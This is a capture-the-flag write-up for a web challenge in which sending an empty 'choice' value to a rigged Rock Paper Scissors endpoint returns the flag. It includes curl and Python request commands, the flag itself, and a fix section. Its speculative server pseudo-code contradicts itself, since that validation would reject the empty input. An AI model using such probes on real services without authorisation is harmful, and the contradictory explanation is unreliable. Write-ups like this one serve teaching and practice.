---
title: "Rock Paper Scissors CTF Writeup"
date: 2026-05-18
categories: [CTF, Web]
tags: [input-validation, edge-cases, empty-input, web-security]
author: yvngdrac
---

# Rock Paper Scissors CTF Writeup

## 📋 Challenge Overview
- **Title:** Rock Paper Scissors
- **Category:** Web Exploitation
- **Difficulty:** Easy
- **Points:** 325
- **Challenge Creator:** [@dtx7791](https://github.com/dtx7791)
- **Host:** [http://18.143.187.55:5001](http://18.143.187.55:5001)

---

## 🎯 The Challenge

We're presented with a classic Rock Paper Scissors game interface. The twist? The description says:
> "Computer Always Win! but maybe not..."

A clear hint that there's a way to outsmart the system and get the flag.

The website has three simple buttons:
- 🪨 **Rock** (`value: 1`)
- 📄 **Paper** (`value: 2`)
- ✂️ **Scissors** (`value: 3`)

---

## 🔍 Initial Reconnaissance

When you play normally, **the computer always wins**.  
This strongly suggests the server-side logic is rigged against the player.

Inspecting the HTML source:
- The game sends a `POST` request to `/play`
- Parameter: `choice` must be one of `1`, `2`, or `3`

---

## 🕵️‍♂️ The Investigation

Tested various inputs to understand how the server validates and processes our choices.

### Testing Normal Inputs

```bash
curl -X POST http://18.143.187.55:5001/play -d "choice=1"
curl -X POST http://18.143.187.55:5001/play -d "choice=2"
curl -X POST http://18.143.187.55:5001/play -d "choice=3"
```

**Result:** All normal choices result in computer winning.

### Testing Invalid Numbers

```bash
curl -X POST http://18.143.187.55:5001/play -d "choice=0"
```

**Response:** `{"error":"Invalid choice. Please use 1 (rock), 2 (paper), or 3 (scissors)"}`

### Testing Edge Cases

Tried special characters, SQL injection payloads, and type juggling.

Then, kept it simple:

```bash
curl -X POST http://18.143.187.55:5001/play -d "choice="
```

**Bingo! 🎯**

---

## 💥 The Exploit

The server doesn't properly handle empty input.  
When sending `choice=` (an empty string), the response is:

```json
{
  "message": "Congratulations! You won!",
  "flag": "BINGOCTF{r0ck_p4p3r_sc1ss0rs_m4st3r}"
}
```

---

## 🧠 Understanding the Vulnerability

**What's happening?**
- **Flawed Validation:** Server checks for `1`, `2`, `3` but doesn't account for empty strings.
- **Type Confusion:** Empty string `""` may be treated differently when compared.
- **Logic Bypass:** The "computer always wins" logic fails with unexpected input.

Probable server code (pseudo-code):

```python
def play_game(user_choice):
    # Flawed validation
    if user_choice not in ['1', '2', '3']:
        return "Invalid choice"
    
    # Rigged game logic (computer always picks winning move)
    computer_choice = get_winning_move(user_choice)
    
    # Comparison that breaks with empty string
    if check_win(user_choice, computer_choice):
        return get_flag()  # 🚩 This gets triggered with empty input!
    else:
        return "Computer wins!"
```

---

## 🚀 The Solution

Send a POST request with **empty choice parameter**!

**One-liner:**
```bash
curl -X POST http://18.143.187.55:5001/play -d "choice=" | grep -o "BINGOCTF{.*}"
```

**Python:**
```python
import requests

url = "http://18.143.187.55:5001/play"
response = requests.post(url, data={"choice": ""})
print(response.json()["flag"])
```

---

## 🏆 The Flag

```
BINGOCTF{r0ck_p4p3r_sc1ss0rs_m4st3r}
```

---

## 📝 Key Takeaways

- Always test **edge cases** (empty strings, null values, boundaries).
- Don't trust **client-side validation**: server-side checks must be robust.
- **Simple tests** often work - sometimes the solution is simpler than expected.
- **Read error messages carefully** - they often reveal validation logic.

---

## 🔒 How to Fix This

Developers should:
- Validate for **empty/null inputs**
- Use **strict type checking**
- Implement **comprehensive input sanitization**
- Test with unusual and malicious inputs during development

---

## 🎉 Conclusion

This challenge is a great example of how **incomplete input validation** can lead to unexpected behavior.  
The "computer always wins" logic had a critical flaw:  
An empty input let us bypass the rigged system and claim victory!
